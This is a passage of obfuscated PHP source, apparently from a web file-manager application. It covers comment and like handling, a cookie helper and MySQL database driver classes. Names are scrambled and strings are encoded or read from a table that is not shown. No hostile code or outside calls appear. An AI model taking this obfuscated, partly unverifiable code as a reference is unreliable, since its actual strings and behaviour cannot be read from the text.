{ $Á±±õ­ = $‡÷«Ñö->file(); } } Backup::set(array($øûŒ›èÑ[834] => 1, $øûŒ›èÑ[845] => time())); return !0; } public function process() { $Ìõ°ŒëÆ =& $_SERVER[«òÑğ]; $æ‘ëµâ = array($Ìõ°ŒëÆ[841] => Task::get($Ìõ°ŒëÆ[869]), $Ìõ°ŒëÆ[846] => Task::get($Ìõ°ŒëÆ[888]), $Ìõ°ŒëÆ[233] => Task::get($Ìõ°ŒëÆ[898])); $Œ–À”–² = !1; foreach ($æ‘ëµâ as &$£òÚ§‡Š) { if ($Œ–À”–²) { $£òÚ§‡Š = !1; continue; } if ($£òÚ§‡Š) { $ì¡†¶ = intval(_get($£òÚ§‡Š, $Ìõ°ŒëÆ[1789], 0)); if (time() - $ì¡†¶ > 7200) { Task::kill($£òÚ§‡Š[$Ìõ°ŒëÆ[478]]); $Œ–À”–² = !0; $£òÚ§‡Š = !1; } } } return $æ‘ëµâ; } public function restore() { $†¡˜†¹­ =& $_SERVER[«òÑğ]; ActionCall($†¡˜†¹­[1147], !0, 1); ActionCall($†¡˜†¹­[1147], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\155\145" => "\143\x6f\x6d\x6d\x65\156\164\137\x6d\x65\164\x61", "\x6d\145\x74\141\x46\151\x65\x6c\x64" => "\x63\157\155\x6d\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ÿ¿£Ëı) { $µöŞ¶àñ =& $_SERVER[«òÑğ]; if ($Ÿ¿£Ëı[$µöŞ¶àñ[2014]]) { $¹ÛÍÌÔ´ = $this->where(array($µöŞ¶àñ[2015] => $Ÿ¿£Ëı[$µöŞ¶àñ[2014]]))->find(); if (!$¹ÛÍÌÔ´ || $¹ÛÍÌÔ´[$µöŞ¶àñ[191]] != $Ÿ¿£Ëı[$µöŞ¶àñ[191]] || $¹ÛÍÌÔ´[$µöŞ¶àñ[574]] != $Ÿ¿£Ëı[$µöŞ¶àñ[574]]) { return !1; } $this->where(array($µöŞ¶àñ[2015] => $Ÿ¿£Ëı[$µöŞ¶àñ[2014]]))->setAdd($µöŞ¶àñ[2016], 1); } $Ÿ¿£Ëı[$µöŞ¶àñ[2017]] = 0; $Ÿ¿£Ëı[$µöŞ¶àñ[2016]] = 0; $Ÿ¿£Ëı[$µöŞ¶àñ[834]] = 1; return $this->add($Ÿ¿£Ëı); } public function commentCount($åàâ“õ, $ƒš‹³Ó›, $­²À‰ï¹ = false) { $ÏÖÕ·Í÷ =& $_SERVER[«òÑğ]; if (!$åàâ“õ) { return array(); } if (is_string($åàâ“õ) || is_int($åàâ“õ)) { $åàâ“õ = array($åàâ“õ); } $·½Šğ¨ı = array($ÏÖÕ·Í÷[574], $ÏÖÕ·Í÷[2018] => $ÏÖÕ·Í÷[570]); $şìŒÊÂ = array($ÏÖÕ·Í÷[574] => array($ÏÖÕ·Í÷[7], $åàâ“õ), $ÏÖÕ·Í÷[191] => $ƒš‹³Ó›); if ($­²À‰ï¹) { $şìŒÊÂ[$ÏÖÕ·Í÷[1784]] = $­²À‰ï¹; } $’‰ëÔğ­ = $this->field($·½Šğ¨ı)->where($şìŒÊÂ)->group($ÏÖÕ·Í÷[574])->select(); return array_to_keyvalue($’‰ëÔğ­, $ÏÖÕ·Í÷[574], $ÏÖÕ·Í÷[570]); } public function starTarget($ºÆ¨ë„, $æ€ˆäõˆ) { $üñ£¦Ã =& $_SERVER[«òÑğ]; $Å›ˆÜ„– = $ºÆ¨ë„ + self::TYPE_STAR_OFFSET; $§¢Ì•ˆ‡ = array($üñ£¦Ã[1784] => USER_ID, $üñ£¦Ã[191] => $Å›ˆÜ„–, $üñ£¦Ã[574] => $æ€ˆäõˆ); $ò›”Ñµ = $this->where($§¢Ì•ˆ‡)->find(); if ($ò›”Ñµ) { return $this->where(array($üñ£¦Ã[478] => $ò›”Ñµ[$üñ£¦Ã[478]]))->delete(); } $–­ºï = array($üñ£¦Ã[2014] => 0, $üñ£¦Ã[1784] => USER_ID, $üñ£¦Ã[834] => 1, $üñ£¦Ã[171] => $üñ£¦Ã[12], $üñ£¦Ã[191] => $Å›ˆÜ„–, $üñ£¦Ã[574] => $æ€ˆäõˆ, $üñ£¦Ã[2017] => 0, $üñ£¦Ã[2016] => 0); return $this->add($–­ºï); } public function starTargetCount($À¦˜™¥, $ïÊšıÇæ) { $¿²øÃŸ¶ =& $_SERVER[«òÑğ]; $ ‚¦ôÈƒ = $ïÊšıÇæ + self::TYPE_STAR_OFFSET; $ø¢ú µ = $this->commentCount($À¦˜™¥, $ ‚¦ôÈƒ); $ò¤­§Š« = $this->commentCount($À¦˜™¥, $ ‚¦ôÈƒ, USER_ID); return array($¿²øÃŸ¶[2019] => $ø¢ú µ, $¿²øÃŸ¶[2020] => $ò¤­§Š«); } public function starTargetUserList($Çï¹æÂ, $è¨ù¿ƒÊ) { $²Ò­ãà =& $_SERVER[«òÑğ]; $…¤ÛÕë– = $Çï¹æÂ + self::TYPE_STAR_OFFSET; $‚ıÁ¸Çø = array($²Ò­ãà[574] => $è¨ù¿ƒÊ, $²Ò­ãà[191] => $…¤ÛÕë–); $¢÷Çè  = $this->where($‚ıÁ¸Çø)->count(); $êÏµÙöº = array($²Ò­ãà[335] => $¢÷Çè , $²Ò­ãà[2021] => array()); if (!$¢÷Çè ) { return $êÏµÙöº; } $ó§õı½È = $this->field($²Ò­ãà[1784])->where($‚ıÁ¸Çø)->limit(500)->select(); $ó§õı½È = array_to_keyvalue($ó§õı½È, $²Ò­ãà[12], $²Ò­ãà[1784]); $êÏµÙöº[$²Ò­ãà[2021]] = Model($²Ò­ãà[582])->userListInfo($ó§õı½È); return $êÏµÙöº; } public function prasiseUserList($ ‡Ş²ã) { $şêªíÉå =& $_SERVER[«òÑğ]; $ÛùÂºü¹ = array($şêªíÉå[2022] => $ ‡Ş²ã); $Ù–¬Ô•³ = $this->where($ÛùÂºü¹)->find(); $†‡·ƒØ = _get($Ù–¬Ô•³, $şêªíÉå[2017], 0); $ ˜œ€˜Û = array($şêªíÉå[335] => $†‡·ƒØ, $şêªíÉå[2021] => array()); if (!$†‡·ƒØ) { return $ ˜œ€˜Û; } $ïÕ±Èó = Model($şêªíÉå[2023])->field($şêªíÉå[1784])->where($ÛùÂºü¹)->limit(500)->select(); $ïÕ±Èó = array_to_keyvalue($ïÕ±Èó, $şêªíÉå[12], $şêªíÉå[1784]); $ ˜œ€˜Û[$şêªíÉå[2021]] = Model($şêªíÉå[582])->userListInfo($ïÕ±Èó); return $ ˜œ€˜Û; } public function remove($‚û†ª£Œ) { $‚º‹¹ÎØ =& $_SERVER[«òÑğ]; $¤¼ıÁ˜Ò = array($‚º‹¹ÎØ[2015] => $‚û†ª£Œ); $æ ÏŠ¥› = $this->where($¤¼ıÁ˜Ò)->find(); if ($æ ÏŠ¥›[$‚º‹¹ÎØ[2014]]) { $this->where(array($‚º‹¹ÎØ[2015] => $æ ÏŠ¥›[$‚º‹¹ÎØ[2014]]))->setAdd($‚º‹¹ÎØ[2016], -1); } return $this->where($¤¼ıÁ˜Ò)->delete(); } public function edit($ ¨‚Ìó‚, $—°ÙÇ´•) { $³³î…ÈÅ =& $_SERVER[«òÑğ]; $—š«ë€ = array($³³î…ÈÅ[2015] => $ ¨‚Ìó‚); return $this->where($—š«ë€)->save(array($³³î…ÈÅ[2024] => $—°ÙÇ´•)); } public function prasise($§Ãç–ñå) { $³½·±´† =& $_SERVER[«òÑğ]; $Áˆªô¯€ = Model($³½·±´†[2025]); $œ™ú³Î = array($³½·±´†[2015] => $§Ãç–ñå, $³½·±´†[1775] => USER_ID); $ï–ÈÕÈÛ = $Áˆªô¯€->where($œ™ú³Î)->find(); if (!$ï–ÈÕÈÛ) { $Áˆªô¯€->add($œ™ú³Î); $§ÎÑú®¿ = $this->where(array($³½·±´†[2015] => $§Ãç–ñå))->setAdd($³½·±´†[2017], 1); } else { $Áˆªô¯€->where($œ™ú³Î)->delete(); $§ÎÑú®¿ = $this->where(array($³½·±´†[2015] => $§Ãç–ñå))->setAdd($³½·±´†[2017], -1); } return $§ÎÑú®¿; } public function targetInfo($µØ“¡•Ì, $®ğ•£©¯) { $ÊÅ¾ºİ± =& $_SERVER[«òÑğ]; $Ôù«–™ = array($ÊÅ¾ºİ±[656] => $µØ“¡•Ì, $ÊÅ¾ºİ±[657] => $®ğ•£©¯); $°½‰ƒ§Ó = $this->where($Ôù«–™)->count(); $ŞˆôÅ› = "\122\111\x47\110\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x63\x6f\155\155\145\x6e\164\137\x70\x72\x61\x69\x73\145\x20\163\x74\141\x72\x20\x6f\x6e\40\143\157\x6d\x6d\145\x6e\164\x2e\143\157\155\x6d\145\x6e\164\111\x44\40\75\x20\x73\x74\141\162\x2e\x63\x6f\155\155\x65\156\x74\x49\104"; $Çš½êíô = $this->alias($ÊÅ¾ºİ±[432])->where($Ôù«–™)->join($ŞˆôÅ›, $ÊÅ¾ºİ±[2026])->count(); $ñ³†ˆÃì = array($ÊÅ¾ºİ±[2027] => $°½‰ƒ§Ó, $ÊÅ¾ºİ±[2028] => $Çš½êíô); return $ñ³†ˆÃì; } public function listData($µŞìÕ±) { $µòİúõé =& $_SERVER[«òÑğ]; if (isset($µŞìÕ±[$µòİúõé[2029]])) { if ($µŞìÕ±[$µòİúõé[2029]]) { $µŞìÕ±[$µòİúõé[2022]] = array($µòİúõé[1101], intval($µŞìÕ±[$µòİúõé[2029]])); } unset($µŞìÕ±[$µòİúõé[2029]]); } if (isset($µŞìÕ±[$µòİúõé[2030]])) { if ($µŞìÕ±[$µòİúõé[2030]]) { $µŞìÕ±[$µòİúõé[2022]] = array($µòİúõé[1098], intval($µŞìÕ±[$µòİúõé[2030]])); } unset($µŞìÕ±[$µòİúõé[2030]]); } return $this->_listData($µŞìÕ±); } private function _listData($ì–”…) { $ »´¹±¬ =& $_SERVER[«òÑğ]; $¾¶©›®  = $this->where($ì–”…)->_makeOrder()->selectPage(100); $this->_listAppendParent($¾¶©›® [$ »´¹±¬[448]]); $this->_listAppendUser($¾¶©›® [$ »´¹±¬[448]]); $this->_listAppendMeta($¾¶©›® [$ »´¹±¬[448]]); return $¾¶©›® ; } private function _makeOrder() { $¤¢‹„‹ =& $_SERVER[«òÑğ]; $¨ÄÉÅ = array($¤¢‹„‹[2017], $¤¢‹„‹[2016], $¤¢‹„‹[234]); $ÎÓù”Ò = Input::get($¤¢‹„‹[533], $¤¢‹„‹[7], $¤¢‹„‹[500], $¨ÄÉÅ); $®İú—È« = Input::get($¤¢‹„‹[534], $¤¢‹„‹[7], $¤¢‹„‹[1777], array($¤¢‹„‹[2031], $¤¢‹„‹[529])); $ğ€§Ÿ½– = $ÎÓù”Ò . $¤¢‹„‹[53] . $®İú—È«; return $this->order($ğ€§Ÿ½–); } private function _listAppendParent(&$¿úëŠùª) { $Ã÷âì»è =& $_SERVER[«òÑğ]; $î¢Ê¹â´ = array_unique(array_to_keyvalue($¿úëŠùª, $Ã÷âì»è[12], $Ã÷âì»è[2014])); $î¢Ê¹â´ = array_remove_value($î¢Ê¹â´, $Ã÷âì»è[231]); if (!$î¢Ê¹â´) { return; } $Şò±¤í— = $this->where(array($Ã÷âì»è[2015] => array($Ã÷âì»è[7], $î¢Ê¹â´)))->select(); $Şò±¤í— = array_to_keyvalue($Şò±¤í—, $Ã÷âì»è[2022]); foreach ($¿úëŠùª as &$ÄÃ¯ÌŠ) { if (isset($Şò±¤í—[$ÄÃ¯ÌŠ[$Ã÷âì»è[2014]]])) { $ÄÃ¯ÌŠ[$Ã÷âì»è[2032]] = $Şò±¤í—[$ÄÃ¯ÌŠ[$Ã÷âì»è[2014]]]; } } unset($ÄÃ¯ÌŠ); } private function _listAppendUser(&$ÒŠ™‘†) { $Œ×Â»¹½ =& $_SERVER[«òÑğ]; $Éš®ÉÀÎ = array_unique(array_to_keyvalue($ÒŠ™‘†, $Œ×Â»¹½[12], $Œ×Â»¹½[1784])); $Éš®ÉÀÎ = array_remove_value($Éš®ÉÀÎ, $Œ×Â»¹½[231]); if (count($Éš®ÉÀÎ) == 0) { return; } foreach ($ÒŠ™‘† as $Š®¼êüû) { if (isset($Š®¼êüû[$Œ×Â»¹½[2032]])) { $Éš®ÉÀÎ[] = $Š®¼êüû[$Œ×Â»¹½[2032]][$Œ×Â»¹½[1784]]; } } $ÖË¿ı‹¬ = Model($Œ×Â»¹½[602])->userListInfo($Éš®ÉÀÎ); foreach ($ÒŠ™‘† as &$Š®¼êüû) { $Š®¼êüû[$Œ×Â»¹½[670]] = $ÖË¿ı‹¬[$Š®¼êüû[$Œ×Â»¹½[1784]]]; if (isset($Š®¼êüû[$Œ×Â»¹½[2032]])) { $Š®¼êüû[$Œ×Â»¹½[2032]][$Œ×Â»¹½[670]] = $ÖË¿ı‹¬[$Š®¼êüû[$Œ×Â»¹½[2032]][$Œ×Â»¹½[1784]]]; } } unset($Š®¼êüû); } private function _listAppendMeta(&$ú¸£ŞÏÃ) { $ğ‰Óšá— =& $_SERVER[«òÑğ]; $¾Ó¬ôñ‡ = array_unique(array_to_keyvalue($ú¸£ŞÏÃ, $ğ‰Óšá—[12], $ğ‰Óšá—[2022])); $¾Ó¬ôñ‡ = array_remove_value($¾Ó¬ôñ‡, $ğ‰Óšá—[231]); if (!$¾Ó¬ôñ‡) { return; } foreach ($ú¸£ŞÏÃ as $¸ÔòŠĞ) { if (isset($¸ÔòŠĞ[$ğ‰Óšá—[2032]])) { $¾Ó¬ôñ‡[] = $¸ÔòŠĞ[$ğ‰Óšá—[2032]][$ğ‰Óšá—[2022]]; } } $£˜ŞÄĞ¦ = $this->metaList($¾Ó¬ôñ‡); if (!$£˜ŞÄĞ¦) { return !1; } foreach ($ú¸£ŞÏÃ as &$¸ÔòŠĞ) { $¸ÔòŠĞ[$ğ‰Óšá—[544]] = $£˜ŞÄĞ¦[$¸ÔòŠĞ[$ğ‰Óšá—[2022]]]; if (isset($¸ÔòŠĞ[$ğ‰Óšá—[2032]])) { $¸ÔòŠĞ[$ğ‰Óšá—[2032]][$ğ‰Óšá—[544]] = $£˜ŞÄĞ¦[$¸ÔòŠĞ[$ğ‰Óšá—[2032]][$ğ‰Óšá—[2022]]]; } } unset($¸ÔòŠĞ); } private function metaList($ÊûÙØ¦ ) { $âä±§ =& $_SERVER[«òÑğ]; if (!$ÊûÙØ¦ ) { return array(); } $ÊÆ·­©ñ = array($âä±§[2022] => array($âä±§[7], $ÊûÙØ¦ )); $üŞà‰ù = Model($âä±§[2033])->where($ÊÆ·­©ñ)->select(); $üŞà‰ù = array_to_keyvalue_group($üŞà‰ù, $âä±§[2022]); foreach ($üŞà‰ù as $âØÚª™û => $°å„Âœ±) { $â§˜¾÷Ş = array(); foreach ($°å„Âœ± as $·®àéİò) { $â§˜¾÷Ş[$·®àéİò[$âä±§[97]]] = $·®àéİò[$âä±§[453]]; } $üŞà‰ù[$âØÚª™û] = $â§˜¾÷Ş; } return $üŞà‰ù ? $üŞà‰ù : array(); } public function removeTarget($íÛ¸½Ø, $“†Ù´À†) { $¡°„„‚ó =& $_SERVER[«òÑğ]; if (!$“†Ù´À†) { return !0; } $“†Ù´À† = is_array($“†Ù´À†) ? $“†Ù´À† : array($“†Ù´À†); $¼¤‘‹ó = array($¡°„„‚ó[191] => $íÛ¸½Ø, $¡°„„‚ó[574] => array($¡°„„‚ó[7], $“†Ù´À†)); $¨¶øá¶¹ = $this->field($¡°„„‚ó[2022])->where($¼¤‘‹ó)->select(); $İÚõ·¢ı = array_to_keyvalue($¨¶øá¶¹, $¡°„„‚ó[12], $¡°„„‚ó[2022]); if (!$İÚõ·¢ı) { return !0; } $¼¤‘‹ó = array($¡°„„‚ó[2022] => array($¡°„„‚ó[7], $İÚõ·¢ı)); $this->where($¼¤‘‹ó)->delete(); Model($¡°„„‚ó[2025])->where($¼¤‘‹ó)->delete(); Model($¡°„„‚ó[2034])->where($¼¤‘‹ó)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\x6c\x65\x5f\143\157\x6e\164\145\x6e\x74\x73"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\x54\x69\155\x65", "\x74\x69\155\145", "\x69\156\163\x65\162\164", "\x66\x75\x6e\x63\x74\151\157\x6e")); } goto CÈ¥§Œ³±ß; cæŒ†Çòù: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($äœäÜ¢ = '', $¼™Ø‹º = 0) { if (is_string($äœäÜ¢) && $äœäÜ¢ != $_SERVER[«òÑğ][12]) { $this->prefix = $äœäÜ¢; } if (is_numeric($¼™Ø‹º) && $¼™Ø‹º > 0) { $this->expire = $¼™Ø‹º; } } public static function getInstance() { static $€¶íôã; if ($€¶íôã === null) { $€¶íôã = new self(); } return $€¶íôã; } private static $cookieDisable = false; public static function disable($©† ½) { self::$cookieDisable = $©† ½; } private static $sameCookieSet = array(); public static function set($êşÔ¢²¿, $Ãïšµ”Ü, $´Œığà× = 0, $æ¬âå×À = false, $»£îı…À = false) { $€Â¸¬È¼ =& $_SERVER[«òÑğ]; if (self::$cookieDisable) { return; } if (!$´Œığà×) { $´Œığà× = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$êşÔ¢²¿]) && self::$sameCookieSet[$êşÔ¢²¿] == $Ãïšµ”Ü . $´Œığà×) { return; } self::$sameCookieSet[$êşÔ¢²¿] = $Ãïšµ”Ü . $´Œığà×; if (!$»£îı…À) { $»£îı…À = str_replace(HOST, $€Â¸¬È¼[12], APP_HOST); $»£îı…À = _get($GLOBALS, $€Â¸¬È¼[970], $»£îı…À); } $äÇ¹ƒ = $€Â¸¬È¼[12]; setcookie($êşÔ¢²¿, $Ãïšµ”Ü, time() + $´Œığà×, $€Â¸¬È¼[8] . trim($»£îı…À, $€Â¸¬È¼[8]) . $äÇ¹ƒ, !1, !1, $æ¬âå×À); } public static function setSafe($½ë£¯ÒÚ, $â¶×ôÁ¨, $Ñ£¤ğÇŸ = 0) { self::set($½ë£¯ÒÚ, $â¶×ôÁ¨, $Ñ£¤ğÇŸ, !0); } public static function get($È¤÷´Ôë) { static $—•áÃç° = false; if (!$—•áÃç°) { self::initHeaderCookie(); $—•áÃç° = !0; } return isset($_COOKIE[$È¤÷´Ôë]) ? $_COOKIE[$È¤÷´Ôë] : !1; } private static function initHeaderCookie() { $ìòººçÓ =& $_SERVER[«òÑğ]; if (!isset($_SERVER[$ìòººçÓ[971]]) || !$_SERVER[$ìòººçÓ[971]]) { return; } $­ºåé§â = explode($ìòººçÓ[74], $_SERVER[$ìòººçÓ[971]]); foreach ($­ºåé§â as $ë‡ÍÊ) { $ë‡ÍÊ = explode($ìòººçÓ[509], $ë‡ÍÊ); if (count($ë‡ÍÊ) != 2 || !isset($ë‡ÍÊ[1])) { continue; } $_COOKIE[trim($ë‡ÍÊ[0])] = trim($ë‡ÍÊ[1]); } } public static function remove($Öä¡¤Àà, $˜Ãó®îš = false) { unset($_COOKIE[$Öä¡¤Àà]); self::set($Öä¡¤Àà, $_SERVER[«òÑğ][12], 1, $˜Ãó®îš); } } class DbMysql extends Db { public function __construct($¼â±˜’œ = '') { $¥ÜãĞ¹Å =& $_SERVER[«òÑğ]; if (!extension_loaded($¥ÜãĞ¹Å[892])) { think_exception(think_lang($¥ÜãĞ¹Å[14]) . $¥ÜãĞ¹Å[972]); } if (!empty($¼â±˜’œ)) { $this->config = $¼â±˜’œ; if (empty($this->config[$¥ÜãĞ¹Å[17]])) { $this->config[$¥ÜãĞ¹Å[17]] = $¥ÜãĞ¹Å[12]; } } } public function connect($Ï›¦ÒµŠ = '', $²¬“ª¶Ë = 0, $â€†™­ = false) { $´¬¥ÇÜÄ =& $_SERVER[«òÑğ]; if (!isset($this->linkID[$²¬“ª¶Ë])) { if (empty($Ï›¦ÒµŠ)) { $Ï›¦ÒµŠ = $this->config; } $•Õ Óà¡ = $Ï›¦ÒµŠ[$´¬¥ÇÜÄ[973]] . ($Ï›¦ÒµŠ[$´¬¥ÇÜÄ[974]] ? "\72{$Ï›¦ÒµŠ[$´¬¥ÇÜÄ[974]]}" : $´¬¥ÇÜÄ[12]); $÷îìÑ‰ = !empty($Ï›¦ÒµŠ[$´¬¥ÇÜÄ[17]][$´¬¥ÇÜÄ[18]]) ? $Ï›¦ÒµŠ[$´¬¥ÇÜÄ[17]][$´¬¥ÇÜÄ[18]] : $this->pconnect; if ($÷îìÑ‰) { $this->linkID[$²¬“ª¶Ë] = mysql_pconnect($•Õ Óà¡, $Ï›¦ÒµŠ[$´¬¥ÇÜÄ[975]], $Ï›¦ÒµŠ[$´¬¥ÇÜÄ[976]], 131072); } else { $this->linkID[$²¬“ª¶Ë] = mysql_connect($•Õ Óà¡, $Ï›¦ÒµŠ[$´¬¥ÇÜÄ[975]], $Ï›¦ÒµŠ[$´¬¥ÇÜÄ[976]], !0, 131072); } if (!$this->linkID[$²¬“ª¶Ë] || !empty($Ï›¦ÒµŠ[$´¬¥ÇÜÄ[21]]) && !mysql_select_db($Ï›¦ÒµŠ[$´¬¥ÇÜÄ[21]], $this->linkID[$²¬“ª¶Ë])) { think_exception(mysql_error()); } $ï÷ŞÖ”Š = mysql_get_server_info($this->linkID[$²¬“ª¶Ë]); mysql_query($´¬¥ÇÜÄ[977] . think_config($´¬¥ÇÜÄ[978]) . $´¬¥ÇÜÄ[58], $this->linkID[$²¬“ª¶Ë]); if ($ï÷ŞÖ”Š > $´¬¥ÇÜÄ[979]) { mysql_query($´¬¥ÇÜÄ[980], $this->linkID[$²¬“ª¶Ë]); } $this->connected = !0; if (1 != think_config($´¬¥ÇÜÄ[22])) { unset($this->config); } } return $this->linkID[$²¬“ª¶Ë]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÌúÁµÀõ) { $ª‹†©ó÷ =& $_SERVER[«òÑğ]; if (0 === stripos($ÌúÁµÀõ, $ª‹†©ó÷[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÌúÁµÀõ; if ($this->queryID) { $this->free(); } think_action_status($ª‹†©ó÷[23], 1); think_status($ª‹†©ó÷[24]); $this->queryID = mysql_query($ÌúÁµÀõ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($®ß‘İÌ) { $™«ù¯óË =& $_SERVER[«òÑğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $®ß‘İÌ; if ($this->queryID) { $this->free(); } think_action_status($™«ù¯óË[25], 1); think_status($™«ù¯óË[24]); $ ‰ÛÑÌÅ = mysql_query($®ß‘İÌ, $this->_linkID); $this->debug(); if (!1 === $ ‰ÛÑÌÅ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[«òÑğ][981], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğ’–ğ˜â = mysql_query($_SERVER[«òÑğ][982], $this->_linkID); $this->transTimes = 0; if (!$ğ’–ğ˜â) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ºæŠ ¯à = mysql_query($_SERVER[«òÑğ][983], $this->_linkID); $this->transTimes = 0; if (!$ºæŠ ¯à) { $this->error(); return !1; } } return !0; } private function getAll() { $ÖÂÔŒ†Œ = array(); if ($this->numRows > 0) { while ($òï²¨Ñ» = mysql_fetch_assoc($this->queryID)) { $ÖÂÔŒ†Œ[] = $òï²¨Ñ»; } mysql_data_seek($this->queryID, 0); } return $ÖÂÔŒ†Œ; } public function getFields($şæ¨›ãĞ) { $œ¿ÁÕ«· =& $_SERVER[«òÑğ]; $’İÈ…¼ = $this->query($œ¿ÁÕ«·[984] . $this->parseKey($şæ¨›ãĞ)); $ØâÙëÎÄ = array(); if ($’İÈ…¼) { foreach ($’İÈ…¼ as $ÕİëÉ¤± => $¾Ü˜¼ü©) { $ØâÙëÎÄ[$¾Ü˜¼ü©[$œ¿ÁÕ«·[31]]] = array($œ¿ÁÕ«·[32] => $¾Ü˜¼ü©[$œ¿ÁÕ«·[31]], $œ¿ÁÕ«·[33] => $¾Ü˜¼ü©[$œ¿ÁÕ«·[34]], $œ¿ÁÕ«·[35] => (bool) (strtoupper($¾Ü˜¼ü©[$œ¿ÁÕ«·[36]]) === $œ¿ÁÕ«·[985]), $œ¿ÁÕ«·[37] => $¾Ü˜¼ü©[$œ¿ÁÕ«·[38]], $œ¿ÁÕ«·[39] => strtolower($¾Ü˜¼ü©[$œ¿ÁÕ«·[40]]) == $œ¿ÁÕ«·[41], $œ¿ÁÕ«·[42] => strtolower($¾Ü˜¼ü©[$œ¿ÁÕ«·[43]]) == $œ¿ÁÕ«·[44]); } } return $ØâÙëÎÄ; } public function getTables($»òúšö = '') { $‚ƒÖãŠ =& $_SERVER[«òÑğ]; if (!empty($»òúšö)) { $ŞŞ›‹é = $‚ƒÖãŠ[986] . $»òúšö . $‚ƒÖãŠ[987]; } else { $ŞŞ›‹é = $‚ƒÖãŠ[988]; } $Ãß³ë²× = $this->query($ŞŞ›‹é); $¬Œ­Áíû = array(); foreach ($Ãß³ë²× as $èº–ûªœ => $¢ôæÓìÛ) { $¬Œ­Áíû[$èº–ûªœ] = current($¢ôæÓìÛ); } return $¬Œ­Áíû; } public function replace($Ş¤²ë—ø, $¸ä€Ú«” = array()) { $ù¶ğ¾³ =& $_SERVER[«òÑğ]; foreach ($Ş¤²ë—ø as $ÛİáƒÔ => $êÆÉ•£) { $¿²–á = $this->parseValue($êÆÉ•£); if (is_scalar($¿²–á)) { $ØŠ·ô³[] = $¿²–á; $¯“†£…ñ[] = $this->parseKey($ÛİáƒÔ); } } $Şı¢¸ó¹ = $ù¶ğ¾³[989] . $this->parseTable($¸ä€Ú«”[$ù¶ğ¾³[359]]) . $ù¶ğ¾³[990] . implode($ù¶ğ¾³[50], $¯“†£…ñ) . $ù¶ğ¾³[991] . implode($ù¶ğ¾³[50], $ØŠ·ô³) . $ù¶ğ¾³[992]; return $this->execute($Şı¢¸ó¹); } public function insertAll($ò²¼ÂĞ¿, $†¶Şù¨ë = array(), $ú¤ÙÔó = false) { $„“ôŠĞ =& $_SERVER[«òÑğ]; if (!is_array($ò²¼ÂĞ¿[0])) { return !1; } $²ó¯†‘º = array_keys($ò²¼ÂĞ¿[0]); $¶‚úÎ©Ä = array(); foreach ($ò²¼ÂĞ¿ as $ˆ²Ä®×ì) { $ä‡Çôš½ = array(); foreach ($ˆ²Ä®×ì as $©æÒµáä => $çÎ­İëÄ) { $çÎ­İëÄ = $this->parseValue($çÎ­İëÄ); if (is_scalar($çÎ­İëÄ)) { $ä‡Çôš½[] = $çÎ­İëÄ; } } $¶‚úÎ©Ä[] = $„“ôŠĞ[340] . implode($„“ôŠĞ[50], $ä‡Çôš½) . $„“ôŠĞ[992]; } array_walk($²ó¯†‘º, array($this, $„“ôŠĞ[993])); $í£Íêï = ($ú¤ÙÔó ? $„“ôŠĞ[994] : $„“ôŠĞ[995]) . $„“ôŠĞ[996] . $this->parseTable($†¶Şù¨ë[$„“ôŠĞ[359]]) . $„“ôŠĞ[990] . implode($„“ôŠĞ[50], $²ó¯†‘º) . $„“ôŠĞ[997] . implode($„“ôŠĞ[50], $¶‚úÎ©Ä); return $this->execute($í£Íêï); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $×ÊÂ¥ =& $_SERVER[«òÑğ]; $this->error = mysql_errno() . $×ÊÂ¥[4] . mysql_error($this->_linkID); if ($×ÊÂ¥[12] != $this->queryStr) { $this->error .= LNG($×ÊÂ¥[48]) . $this->queryStr; } think_trace($this->error, $×ÊÂ¥[12], $×ÊÂ¥[49]); return $this->error; } public function escapeString($Ñ©¿³Œ®) { if ($this->_linkID) { return mysql_real_escape_string($Ñ©¿³Œ®, $this->_linkID); } else { return mysql_escape_string($Ñ©¿³Œ®); } } public function parseKey(&$ö ­°¤‹, $œ¶®ú®“ = true) { $ÔÓÚ ¾† =& $_SERVER[«òÑğ]; if ($œ¶®ú®“) { $ö ­°¤‹ = $this->parseKeyCheck($ö ­°¤‹); } if ($ö ­°¤‹ != $ÔÓÚ ¾†[223] && !preg_match($ÔÓÚ ¾†[998], $ö ­°¤‹)) { $ö ­°¤‹ = $ÔÓÚ ¾†[464] . trim($ö ­°¤‹, $ÔÓÚ ¾†[464]) . $ÔÓÚ ¾†[464]; } return $ö ­°¤‹; } } class DbMysqli extends Db { public function __construct($İãäÒ½ = '') { $ôä£ˆğ =& $_SERVER[«òÑğ]; if (!extension_loaded($ôä£ˆğ[999])) { think_exception(think_lang($ôä£ˆğ[14]) . $ôä£ˆğ[1000]); } if (!empty($İãäÒ½)) { $this->config = $İãäÒ½; if (empty($this->config[$ôä£ˆğ[17]])) { $this->config[$ôä£ˆğ[17]] = $ôä£ˆğ[12]; } } } public function connect($ü‘Ù³¾Š = '', $ü¡»ÓÉ¸ = 0) { $ÓäÇ·ÑÉ =& $_SERVER[«òÑğ]; if 